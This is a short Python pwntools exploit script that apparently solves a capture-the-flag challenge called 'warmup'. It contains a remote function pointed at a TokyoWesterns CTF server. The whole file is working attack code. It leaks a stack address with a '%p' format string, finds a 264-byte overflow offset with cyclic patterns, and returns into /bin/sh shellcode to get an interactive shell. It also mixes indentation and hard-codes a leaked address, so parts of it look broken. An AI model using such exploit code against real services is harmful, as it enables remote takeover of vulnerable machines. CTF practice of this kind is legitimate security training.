# coding: utf-8
from pwn import *

context(arch='amd64', os='linux', endian='little', word_size=64)
r = process('./warmup')
print r.recv()
r.sendline('%p')
print r.recv()

shellcode = asm(pwnlib.shellcraft.amd64.linux.sh())
r.close()
r = process('./warmup')
print r.recv()

r.sendline(cyclic(300))
print r.recv()

cyclic(268)

cyclic_find(0x63616171)

offset = 264
main = 0x004006ba
r.close()
r = process('./warmup')
r.recv()
r.sendline('%p' + ('A' * (offset-2)) + p64(main))
r.recv()
buf = 0x7fe66db25a83
payload = shellcode + ('A' * (offset-len(shellcode))) + p64(buf)
r.sendline(payload)
r.interactive()

def pwn () :
	r = remote('nothing.chal.ctf.westerns.tokyo', 10001)
	print r.recv()
	r.sendline('%p' + ('A' * (offset-2)) + p64(main))
        print r.recv()
        h = int(raw_input("Buff addr: "), 16)
        payload = shellcode + ('A' * (offset-len(shellcode))) + p64(h)
        r.sendline(payload)
        r.interactive()


